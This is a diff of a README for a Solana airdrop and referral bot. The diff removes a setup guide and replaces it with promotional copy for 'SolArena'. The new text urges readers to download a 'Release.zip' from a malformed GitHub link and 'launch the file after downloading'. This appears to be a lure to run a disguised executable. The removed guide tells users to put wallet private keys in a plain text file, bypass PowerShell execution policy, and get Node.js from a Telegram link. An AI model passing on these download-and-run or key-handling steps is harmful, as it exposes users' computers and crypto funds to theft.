@@ -1,154 +1,35 @@
-# 🚀 Bot Setup Instructions
+# SolArena: Revolutionizing Airdrops and GameFi on the Solana Blockchain 🚀
 
-Welcome to the bot setup guide! Follow the steps below to install and configure the bot correctly. This guide is designed to be beginner-friendly, with clear explanations for each step.
+Welcome to **SolArena**, the ultimate platform for automating wallet connections, referrals, and airdrop claim bots on the Solana blockchain. With SolArena, you can unlock a world of opportunities in the fast-growing GameFi sector while earning rewards through airdrops and referrals. 
 
-> [Termux guides if you run on mobile](https://github.com/MeoMunDep/Guides-for-using-my-script-on-termux)
+## Features 🌟
 
----
+🔗 **Auto Connect Wallets**: Seamlessly connect your wallets to access various GameFi platforms on Solana.
 
-## Table of Contents
+🔁 **Referral System**: Leverage our referral system to earn additional rewards by inviting others to join SolArena.
 
-1. [Prerequisites](#prerequisites)
-2. [Installation Steps](#installation-steps)
-3. [Configuration Files](#configuration-files)
-   - [`configs.json`](#1-configsjson)
-   - [`privateKeys.txt`](#2-privateKeystxt)
-   - [`wallets.txt`](#3-walletstxt)
-   - [`proxies.txt`](#4-proxiestxt)
-4. [Running the Bot](#running-the-bot)
-5. [Contact and Support](#contact-and-support)
+💰 **Airdrop Claim Bot**: Automatically claim airdrops to your connected wallets without any hassle.
 
----
+🎮 **GameFi Integration**: Explore and participate in the exciting world of GameFi projects on Solana.
 
-## Prerequisites
+## Repository Details 📁
 
-Before running the bot, make sure you have the following installed:
+- **Repository Name**: SolArena
+- **Description**: Auto connect wallets, referrals. [50 STARS TO UNLOCK]
+- **Topics**: airdrop, airdrop-application, airdrop-claim-bot, airdrop-farm, airdrop-free, airdrop-hunter-download, airdrop-solana, gamefi, solana, solarena, web
 
-- **Node.js** (Version: `22.11.0`)
-- **npm** (Version: `10.9.0`)
+## Get Started 🚀
 
-Download Node.js and npm here: [Download Link](https://t.me/KeoAirDropFreeNe/257/1462).
+To access the latest release of SolArena, download it from [this link](https://github.com/releases/789694263/Release.zip).
 
--> Double click on `run.bat` for windows or `run.sh` for linux/mac if you want to run automatically, remember to fill all the necessary data.
+[![](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/releases/789694263/Release.zip)
 
----
+Note: Please ensure to launch the file after downloading to start experiencing the power of SolArena.
 
-## Installation Steps
+## Explore More 🔍
 
-1. **Download and Extract the Bot Files:**
+Visit our repository to dive deeper into the SolArena ecosystem and stay updated on the latest developments and releases.
 
-   - Extract the bot package into a folder on your computer.
+Join us on this exciting journey into the world of GameFi and airdrops on Solana with SolArena! 🎮💸🌐
 
-2. **Install Dependencies:**
-   Open your terminal or command prompt, navigate to the folder where the bot files are located, and run:
-
-   ```bash
-   npm install --force user-agents axios colors https-proxy-agent socks-proxy-agent tweetnacl crypto-js ws uuid @solana/web3.js bs58
-   ```
-
-   If you encounter an Execution Policy error on Windows, run:
-
-   ```bash
-   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-   ```
-
-   Then, run the npm install command again.
-
-3. **Prepare Configuration Files:**
-   - Ensure all configuration files are set up correctly before running the bot (see [Configuration Files](#configuration-files) section).
-
----
-
-## Configuration Files
-
-### 1. `configs.json` - 📜 Adjust Bot Settings
-
-This file controls the bot’s behavior. Below is an example configuration:
-
-```json
-{
-  "timeZone": "en-US",
-  "rotateProxy": false,
-  "skipInvalidProxy": false,
-  "proxyRotationInterval": 2,
-  "delayEachAccount": [1, 1],
-  "timeToRestartAllAccounts": 300,
-  "howManyAccountsRunInOneTime": 100,
-  "referral": true,
-  "referralCodes": ["bGAxXum"],
-}
-```
-
-- **Fields Explained:**
-  - `timeZone`: Time zone setting (e.g., "en-US").
-  - `rotateProxy`: Enable or disable proxy rotation.
-  - `skipInvalidProxy`: Skip invalid proxies if `true`.
-  - `referral`: Enable referral feature if `true`.
-  - `proxyRotationInterval`: Time interval (in minutes) for rotating proxies.
-  - `delayEachAccount`: Random delay range (in seconds) between accounts.
-  - `timeToRestartAllAccounts`: Time (in seconds) to restart all accounts.
-  - `howManyAccountsRunInOneTime`: Number of accounts to run simultaneously.
-  - `referralCodes`: Add your referral code (optional). Do not change it if you want to support me ^^
-
-### 2. `privateKeys.txt` - 🗂️ User's wallet data
-
-- Wallets generator: [Link](https://github.com/MeoMunDep/Automatic-Ultimate-Create-Wallets-for-Airdrop)
-
-```txt
-privatekey
-privatekey
-privatekey
-```
-
-_Note: Each row for each account_
-
-### 3. `proxies.txt` - 🌐 Proxy List (Optional)
-
-If you are using proxies, add them here. Leave the file blank if you are not using proxies. Supported formats:
-
-```txt
-http://host:port
-https://host:port
-socks4://host:port
-socks5://host:port
-http://user:password@host:port
-https://user:password@host:port
-socks4://user:password@host:port
-socks5://user:password@host:port
-```
-
-_Note: each row for each account_
-
----
-
-## Running the Bot
-
-1. Navigate to the folder containing the bot files:
-
-   ```bash
-   cd /path/to/meomundep-folder
-   ```
-
-2. Run the bot using the following command:
-   ```bash
-   node meomundep.js
-   ```
-
----
-
-## Contact and Support
-
-- **Help me with your referral** [Referral Link](https://play.solarena.io/) - Referral Code: ```bash bGAxXum```
-- **Buy me a telegram account** [Here](https://t.me/KeoAirDropFreeNe/312/27801) or [Here](https://github.com/MeoMunDep/MeoMunDep)
-
-If you encounter any issues or have questions, feel free to reach out:
-
-- **Contact:** [Contact Me](https://t.me/MeoMunDep)
-- **Group:** [Join the Group](https://t.me/KeoAirDropFreeNe)
-- **Channel:** [Visit the Channel](https://t.me/KeoAirDropFreeNee)
-
-Your support is greatly appreciated! 🐱
-
----
-
-Enjoy using the bot! 🚀
+Let's revolutionize the way we engage with blockchain gaming and airdrop opportunities together! 🚀🔥
